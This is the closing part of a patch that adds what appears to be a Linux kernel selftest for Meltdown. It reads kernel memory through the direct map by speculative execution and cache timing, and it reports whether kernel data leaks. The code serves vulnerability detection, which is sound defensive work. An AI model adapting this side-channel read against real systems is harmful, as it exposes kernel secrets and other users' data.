+	memcpy(p, string, sizeof(string));
+
+	if (virt_to_phys((unsigned long)p, &phys) == -1) {
+		printf("[SKIP]\tCan not convert virtual address to physical address\n");
+		return 0;
+	}
+
+	len = strlen(string);
+	result = malloc(len + 1);
+	if (!result) {
+		printf("[SKIP]\tNot enough memory for malloc\n");
+		return 0;
+	}
+	memset(result, 0, len + 1);
+
+	for (i = 0; i < len; i++, phys++) {
+		result[i] = readbyte(spec_fd, directmap_base + phys);
+		if (result[i] == 0)
+			break;
+	}
+
+	ret = !strncmp(string, result, len);
+	if (ret)
+		printf("[FAIL]\ttest_read_local_var: low kernel mapping leak found.\n");
+	else
+		printf("[OK]\ttest_read_local_var: no leak found.\n");
+
+	free(result);
+	munmap(p, 0x1000);
+	close(spec_fd);
+
+	return ret;
+}
+
+int main(void)
+{
+	int ret1, ret2;
+
+	printf("[RUN]\tTest if system is vulnerable to meltdown\n");
+
+	set_cache_hit_threshold();
+
+	memset(target_array, 1, sizeof(target_array));
+
+	if (set_signal() < 0) {
+		printf("[SKIP]\tCan not set handler for segfault\n");
+		return 0;
+	}
+
+	ret1 = test_read_local_var();
+	ret2 = test_read_saved_command_line();
+
+	if (ret1 || ret2)
+		return -1;
+
+	return 0;
+}
-- 
2.39.0

